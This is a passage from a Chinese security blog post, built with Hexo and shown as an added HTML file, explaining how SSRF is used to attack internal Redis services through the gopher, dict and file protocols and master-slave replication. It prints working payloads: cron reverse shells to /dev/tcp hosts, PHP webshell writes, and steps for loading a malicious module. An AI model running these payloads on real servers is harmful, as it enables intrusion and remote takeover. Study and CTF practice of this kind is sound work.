@@ -1,0 +1,742 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="研究一下 利用ssrf攻击内网Redis服务">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>利用SSRF攻击内网Redis服务 - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="利用SSRF攻击内网Redis服务">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-17 17:54" pubdate>
+        2022年3月17日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      48
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">利用SSRF攻击内网Redis服务</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>研究一下 利用ssrf攻击内网Redis服务</p>
+<span id="more"></span>
+
+<h1 id="利用ssrf攻击内网Redis服务"><a href="#利用ssrf攻击内网Redis服务" class="headerlink" title="利用ssrf攻击内网Redis服务"></a>利用ssrf攻击内网Redis服务</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。</p>
+<h2 id="Redis服务"><a href="#Redis服务" class="headerlink" title="Redis服务"></a>Redis服务</h2><p>Redis 即 REmote Dictionary Server (远程字典服务)</p>
+<p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统  </p>
+<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API  </p>
+<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型  </p>
+<p>默认端口：6379</p>
+<h3 id="Redis语法"><a href="#Redis语法" class="headerlink" title="Redis语法"></a>Redis语法</h3><p>Redis 命令用于在 redis 服务上执行操作，其基本语法为： </p>
+<div class="hljs code-wrapper"><pre><code>$ redis-cli
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuarvin/p/8557042.html">参考—Redis基本语法</a></p>
+<h2 id="攻击payload解读"><a href="#攻击payload解读" class="headerlink" title="攻击payload解读"></a>攻击payload解读</h2><h5 id="反弹webshell-需服务器"><a href="#反弹webshell-需服务器" class="headerlink" title="反弹webshell(需服务器)"></a>反弹webshell(需服务器)</h5><div class="hljs code-wrapper"><pre><code>redis-cli -h $1 flushall
+echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.1/2333 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
+redis-cli -h $1 config set dir /var/spool/cron/
+redis-cli -h $1 config set dbfilename root
+redis-cli -h $1 save
+
+
+1.redis-cli -h $1 flushall
+调用redis的命令，-h这里指的是我们的主机ip地址，即$1这个变量，Flushall 命令用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key)
+
+
+2.echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
+这里我们利用到了Redis的管道技术，可以查看使用手册，手册上对其的定义是Redis 管道技术可以在服务端未响应时，客户端可以继续向服务端发送请求，并最终一次性读取所有服务端的响应
+将前半段语句带入得到，可以看到后半段是一个bashshell反弹，前半段我在网上查了之后发现这应该是定时计划，就是定时的执行我们的bash反弹
+有三种定时的文件 /var/spool/cron/root ， /var/spool/cron/crontabs/root 以及/etc/crontab
+
+
+3.redis-cli -h $1 config set dir /var/spool/cron/
+指定本地数据库存放目录为/var/spool/cron/
+
+
+4.redis-cli -h $1 config set dbfilename root
+config get：获取配置文件信息。config set：动态地调整 Redis 服务器的配置(configuration)而无须重启，可以修改的配置参数可以使用命令 CONFIG GET * 来列出，指定本地数据库文件名，默认值为dump.rdb
+
+
+5.redis-cli -h $1 save
+执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB 文件的形式保存到硬盘， 保存成功就返回 OK ，这一步就是保存到我们的硬盘文件上
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/12872815.html">参考—Redis利用，攻击内网（ssrf）</a></p>
+<h5 id="向目标服务器写码"><a href="#向目标服务器写码" class="headerlink" title="向目标服务器写码"></a>向目标服务器写码</h5><div class="hljs code-wrapper"><pre><code> flushall
+ set 1 &lt;?php system(&quot;find / -name fla*&quot;);?&gt;
+ config set dir /var/www/html
+ config set dbfilename shell.php
+ save
+</code></pre></div>
+<p><img src="/2022/03/17/ssrf-redis/resp-3.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p>Redis的协议规范是 Redis Serialization Protocol (Redis序列化协议)</p>
+<p>Redis 的客户端和服务端之间采取了一种独立的名为 RESP(REdis Serialization Protocol) 的协议，作者主要考虑了以下几个点：</p>
+<ul>
+<li>实现简单</li>
+<li>快速解析</li>
+<li>可读性强</li>
+</ul>
+<p>注意：RESP 虽然是为 Redis 设计的，但是同样也可以用于其他 C/S 的软件</p>
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>RESP 主要可以序列化以下几种类型：整数，单行回复(简单字符串)，数组，错误信息，多行字符串  </p>
+<p>Redis 客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器</p>
+<h5 id="客户端—-gt-服务器"><a href="#客户端—-gt-服务器" class="headerlink" title="客户端—&gt;服务器"></a>客户端—&gt;服务器</h5><div class="hljs code-wrapper"><pre><code>192.168.163.128:6379&gt; set name test
+OK
+192.168.163.128:6379&gt; get name
+&quot;test&quot;
+192.168.163.128:6379&gt;
+</code></pre></div>
+<p>抓取数据包</p>
+<p><img src="/2022/03/17/ssrf-redis/resp-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>hex–&gt;</p>
+<p><img src="/2022/03/17/ssrf-redis/resp-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>客户端向将命令作为Bulk Strings的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型  </p>
+<p>数据包分析，首先是<br>*3，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）<br>$4代表字符串的长度<br>0d0a即\r\n表示结束符<br>+OK表示服务端执行成功后返回的字符串</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">参考—浅析Redis中SSRF的利用 -&gt; RESP协议</a></p>
+<h5 id="服务器—-gt-客户端"><a href="#服务器—-gt-客户端" class="headerlink" title="服务器—&gt;客户端"></a>服务器—&gt;客户端</h5><p>服务端根据不同的命令回复不同类型的数据，但协议的每部分都是以 “\r\n” (CRLF) 结尾的</p>
+<p>在 RESP 中, 一些数据的类型通过它的第一个字节进行回显判断：</p>
+<ul>
+<li>单行回复：回复的第一个字节是 “ + ”</li>
+<li>错误信息：回复的第一个字节是 “ - ”</li>
+<li>整形数字：回复的第一个字节是 “ : ”</li>
+<li>多行字符串：回复的第一个字节是 “ $ ”</li>
+<li>数组：回复的第一个字节是 “ * ”</li>
+</ul>
+<hr>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具。它支持文件上传和下载，所以是综合传输工具。cURL还包含了用于程序开发的libcurl</p>
+<p>cURL支持的通信协议有：FTP、FTPS、HTTP、HTTPS、Gopher、SCP、Telnet、DICT、FILE、LDAP、LDAPS、IMAP、POP3、SMTP和RTSP<br>cURL还支持SSL认证、HTTP POST、HTTP PUT、FTP</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><div class="hljs code-wrapper"><pre><code>curl_init() 初始化一个cURL会话
+
+curl_setopt() 设置一个cURL传输选项
+
+curl_exec() 执行cURL会话
+
+curl_close() 关闭cURL会话
+</code></pre></div>
+<h3 id="curl请求网页"><a href="#curl请求网页" class="headerlink" title="curl请求网页"></a>curl请求网页</h3><div class="hljs code-wrapper"><pre><code>$url=&quot;&quot;;                //设置url
+
+$ch = curl_init();        //初使化curl
+
+curl_setopt($ch, CURLOPT_URL, $url);              //请求的url，由形参传入
+
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    //将得到的数据返回
+
+curl_setopt($ch, CURLOPT_HEADER, 0);            //不处理头信息
+
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);            //连接超过10秒超时
+
+$output = curl_exec($ch);                        //执行curl
+
+curl_close($ch);                                //关闭资源
+
+echo $output;                                    //返回内容
+
+
+$url=&quot;&quot;;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+$output = curl_exec($ch);
+curl_close($ch);
+</code></pre></div>
+<hr>
+<h1 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h1><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口</p>
+<p>Gopher 协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面</p>
+<h3 id="Gopher协议格式"><a href="#Gopher协议格式" class="headerlink" title="Gopher协议格式"></a>Gopher协议格式</h3><div class="hljs code-wrapper"><pre><code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流
+</code></pre></div>
+<ul>
+<li><p>gopher的默认端口是6379  </p>
+</li>
+<li><p>如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p>
+</li>
+</ul>
+<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p><img src="/2022/03/17/ssrf-redis/gopher-1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Gopher协议GET传数据"><a href="#Gopher协议GET传数据" class="headerlink" title="Gopher协议GET传数据"></a>Gopher协议GET传数据</h3><h3 id="Gopher协议POST传数据"><a href="#Gopher协议POST传数据" class="headerlink" title="Gopher协议POST传数据"></a>Gopher协议POST传数据</h3><h3 id="url编码payload中的-0a改为-0d-0a"><a href="#url编码payload中的-0a改为-0d-0a" class="headerlink" title="url编码payload中的%0a改为%0d%0a"></a>url编码payload中的%0a改为%0d%0a</h3><p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/">参考—利用 Gopher 协议拓展攻击面</a></p>
+<hr>
+<h1 id="Dict-协议"><a href="#Dict-协议" class="headerlink" title="Dict 协议"></a>Dict 协议</h1><p>Dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的</p>
+<p>它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典  </p>
+<p>Dict服务器和客户机使用TCP端口2628</p>
+<h2 id="Dict-利用"><a href="#Dict-利用" class="headerlink" title="Dict 利用"></a>Dict 利用</h2><div class="hljs code-wrapper"><pre><code>dict://serverip:port/命令
+</code></pre></div>
+<p>参数向服务器的端口请求为【命令:参数】，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p>
+<h1 id="File-协议"><a href="#File-协议" class="headerlink" title="File 协议"></a>File 协议</h1><p>file协议主要用于访问本地计算机中的文件</p>
+<p>file协议主要用于访问本地计算机中的文件</p>
+<h2 id="File-利用"><a href="#File-利用" class="headerlink" title="File 利用"></a>File 利用</h2><p>file://文件路径</p>
+<p>使用file协议可以直接读取目标操作系统的文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/12970919.html">参考—SSRF漏洞用到的其他协议（dict协议，file协议）</a></p>
+<h1 id="反弹webshell-需服务器-1"><a href="#反弹webshell-需服务器-1" class="headerlink" title="反弹webshell(需服务器)"></a>反弹webshell(需服务器)</h1><h2 id="Gopher-协议"><a href="#Gopher-协议" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h2><p>改成适配于 Gopher 协议的 URL</p>
+<p>1.攻击地址<br>2.本地地址(反弹shell的地址)</p>
+<div class="hljs code-wrapper"><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/gopher-attack-surfaces/#h2.2_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-redis">参考—利用 Gopher 协议拓展攻击面</a></p>
+<h2 id="Dict-协议-1"><a href="#Dict-协议-1" class="headerlink" title="Dict 协议"></a>Dict 协议</h2><p>1.攻击地址<br>2.本地地址(反弹shell的地址)</p>
+<div class="hljs code-wrapper"><pre><code>curl dict://192.168.0.119:6379/set:mars:&quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\n\n&quot;
+curl dict://192.168.0.119:6379/config:set:dir:/etc/
+curl dict://192.168.0.119:6379/config:set:dbfilename:crontab
+curl dict://192.168.0.119:6379/bgsave
+
+curl dict://192.168.0.119:6379/set:mars:\&quot;\\x0a\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x2a\\x20\\x72\\x6f\\x6f\\x74\\x20\\x62\\x61\\x73\\x68\\x20\\x2d\\x69\\x20\\x3e\\x26\\x20\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x30\\x2e\\x31\\x31\\x39\\x2f\\x39\\x39\\x39\\x39\\x20\\x30\\x3e\\x26\\x31\\x0a\&quot;
+</code></pre></div>
+<hr>
+<h1 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h1><h2 id="Gopher-协议-1"><a href="#Gopher-协议-1" class="headerlink" title="Gopher 协议"></a>Gopher 协议</h2><p>改成适配于 Gopher 协议的 URL</p>
+<p>url解码，修改payload</p>
+<p>1.攻击地址</p>
+<div class="hljs code-wrapper"><pre><code>//&lt;?php system(&quot;find / -name fla*&quot;);?&gt;
+需要注意换行也算字节数
+
+gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2440%0D%0A%0A%0A%3C%3Fphp%20system%28%22find%20/%20-name%20fla%2A%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+
+//&lt;?php system(&quot;cat /flag&quot;);?&gt;
+
+gopher://10.138.132.10:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
+
+---请求url/shell.php
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://err0r.top/article/Buuoj-WEB-Write-up/?highlight=ssrf">参考—err0r—EZ三剑客-EzWeb</a></p>
+<p>题目—BUU—[GKCTF2020]EZ三剑客-EzWeb</p>
+<hr>
+<h1 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
+<hr>
+<h1 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
+<hr>
+<h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
+<hr>
+<h1 id="redis-主从复制-rce"><a href="#redis-主从复制-rce" class="headerlink" title="redis 主从复制 rce"></a>redis 主从复制 rce</h1><h2 id="主从复制原理"><a href="#主从复制原理" class="headerlink" title="主从复制原理"></a>主从复制原理</h2><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br>redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis</p>
+<p><img src="/2022/03/17/ssrf-redis/copy-1.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="三种方式建立主从复制"><a href="#三种方式建立主从复制" class="headerlink" title="三种方式建立主从复制"></a>三种方式建立主从复制</h2><p>1.配置文件写入 </p>
+<div class="hljs code-wrapper"><pre><code>slaveof &lt;master_ip&gt; &lt;master_port&gt;
+</code></pre></div>
+<p>2.redis-server启动命令后加入 </p>
+<div class="hljs code-wrapper"><pre><code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;
+</code></pre></div>
+<p>3.连接到客户端之后执行</p>
+<div class="hljs code-wrapper"><pre><code>slaveof &lt;master_ip&gt; &lt;master_port&gt;
+</code></pre></div>
+<p>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</p>
+<h2 id="redis-module"><a href="#redis-module" class="headerlink" title="redis module"></a>redis module</h2><p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能  </p>
+<p>Redis模块是动态库，可以在启动时或使用 MODULE LOAD 命令加载到Redis中</p>
+<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用全量复制将master上的RDB文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p>
+<p>slave 和 master 握手协议过程</p>
+<p><img src="/2022/03/17/ssrf-redis/copy-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>常量说明</p>
+<div class="hljs code-wrapper"><pre><code>#define REPL_STATE_CONNECTING 2 /* 等待和master连接 */
+/* --- 握手状态开始 --- */
+#define REPL_STATE_RECEIVE_PONG 3 /* 等待PING返回 */
+#define REPL_STATE_SEND_AUTH 4 /* 发送认证消息 */
+#define REPL_STATE_RECEIVE_AUTH 5 /* 等待认证回复 */
+#define REPL_STATE_SEND_PORT 6 /* 发送REPLCONF信息，主要是当前实例监听端口 */
+#define REPL_STATE_RECEIVE_PORT 7 /* 等待REPLCONF返回 */
+#define REPL_STATE_SEND_CAPA 8 /* 发送REPLCONF capa */
+#define REPL_STATE_RECEIVE_CAPA 9 /* 等待REPLCONF返回 */
+#define REPL_STATE_SEND_PSYNC 10 /* 发送PSYNC */
+#define REPL_STATE_RECEIVE_PSYNC 11 /* 等待PSYNC返回 */
+/* --- 握手状态结束 --- */
+#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */
+</code></pre></div>
+<p>利用全量复制将master上的RDB文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</p>
+<h2 id="全量复制"><a href="#全量复制" class="headerlink" title="全量复制"></a>全量复制</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
+<h2 id="增量复制"><a href="#增量复制" class="headerlink" title="增量复制"></a>增量复制</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">https://www.cnblogs.com/linuxsec/articles/11221756.html</a></p>
+<h2 id="手动getshell"><a href="#手动getshell" class="headerlink" title="手动getshell"></a>手动getshell</h2><p>配置一个我们需要以master身份给slave传输so文件的服务</p>
+<div class="hljs code-wrapper"><pre><code>PING 测试连接是否可用
++PONG 告诉slave连接可用
+REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
++OK 告诉slave成功接受
+REPLCONF 发送REPLCONF capa
++OK 告诉slave成功接受
+PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC
+</code></pre></div>
+<p>将要攻击的redis服务器设置成我们的slave</p>
+<div class="hljs code-wrapper"><pre><code>SLAVEOF ip port
+</code></pre></div>
+<p>设置RDB文件    </p>
+<p>PS : 这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用</p>
+<p>config set dir path</p>
+<div class="hljs code-wrapper"><pre><code>config set dbfilename exp.so
+</code></pre></div>
+<p>告诉slave使用全量复制并从我们配置的Rouge Server接收module</p>
+<div class="hljs code-wrapper"><pre><code>+FULLRESYNC &lt;runid&gt; &lt;offest&gt;\r\n$&lt;len(payload)&gt;\r\n&lt;payload&gt;
+</code></pre></div>
+<p>PS：其中<runid>无要求，不过长度一般为40，<offest>一般设置为1</offest></runid></p>
+<h2 id="自动化getshell"><a href="#自动化getshell" class="headerlink" title="自动化getshell"></a>自动化getshell</h2><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的  </p>
+<p>通过脚本实现一键自动化getshell：</p>
+<p>1.生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成</p>
+<div class="hljs code-wrapper"><pre><code>git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
+cd RedisModules-ExecuteCommand/
+make
+</code></pre></div>
+<p>2.攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</p>
+<div class="hljs code-wrapper"><pre><code>git clone https://github.com/Ridter/redis-rce.git
+cd redis-rce/
+cp ../RedisModules-ExecuteCommand/src/module.so ./
+pip install -r requirements.txt 
